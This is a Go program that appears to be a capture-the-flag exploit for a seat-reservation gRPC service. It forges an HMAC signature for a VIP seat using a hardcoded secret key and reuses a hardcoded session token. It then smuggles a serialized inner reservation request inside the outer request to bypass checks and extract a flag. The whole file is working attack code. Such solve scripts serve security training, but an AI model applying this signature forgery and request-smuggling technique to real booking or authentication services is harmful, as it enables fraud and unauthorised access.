
package main

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"log"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/protobuf/proto"

	pb "fifa-chal/backend/gen" 
)

const (
	address      = "localhost:50051"
	secretKey    = "portuguenese"                      
	targetSeat   = "A1"                                
	targetZone   = pb.SeatZone_VIP                     
	sessionToken = "5339f555e8deec4357fa0bfbbc141069"  
)

func main() {
	// Connect to gRPC server
	conn, err := grpc.Dial(address, grpc.WithTransportCredentials(credentials.NewClientTLSFromCert(nil, "")))
	if err != nil {
		log.Fatalf("did not connect: %v", err)
	}
	defer conn.Close()
	client := pb.NewSeatServiceClient(conn)

	// Calculate HMAC for the target seat
	mac := hmac.New(sha256.New, []byte(secretKey))
	mac.Write([]byte(targetSeat))
	signature := hex.EncodeToString(mac.Sum(nil))

	fmt.Printf("[*] Target Seat: %s\n", targetSeat)
	fmt.Printf("[*] Forged Signature: %s\n", signature)
	fmt.Printf("[*] Using Session: %s\n", sessionToken)

	// Create the inner FinalReserveSeatRequest message
	innerRequest := &pb.FinalReserveSeatRequest{
		Hash:         signature,
		Zone:         targetZone,
		SessionToken: sessionToken,
	}

	// Serialize it to bytes
	serializedData, err := proto.Marshal(innerRequest)
	if err != nil {
		log.Fatalf("Failed to serialize inner request: %v", err)
	}

	fmt.Printf("[*] Serialized payload size: %d bytes\n", len(serializedData))

	// Create the outer ReserveSeatRequest with raw bytes
	outerRequest := &pb.ReserveSeatRequest{
		Request: serializedData,
	}

	// Send the request
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	resp, err := client.ReserveSeat(ctx, outerRequest)
	if err != nil {
		log.Fatalf("Attack failed: %v", err)
	}

	// Parse the response
	if resp.Success {
		fmt.Println("[+] Reservation Successful!")
		fmt.Printf("[+] Server Message: %s\n", resp.Message)
		
		// Deserialize the ticket data to extract the flag
		hiddenTicket := &pb.ConfirmedTicket{}
		err := proto.Unmarshal(resp.TicketData, hiddenTicket)
		if err != nil {
			log.Fatalf("[-] Failed to deserialize ticket data: %v", err)
		}

		fmt.Println("---------------------------------------------------")
		fmt.Printf("🚩 CAPTURED FLAG: %s\n", hiddenTicket.Flag)
		fmt.Println("---------------------------------------------------")
	} else {
		fmt.Println("[-] Request accepted but success was false.")
		fmt.Printf("[-] Message: %s\n", resp.Message)
	}
}
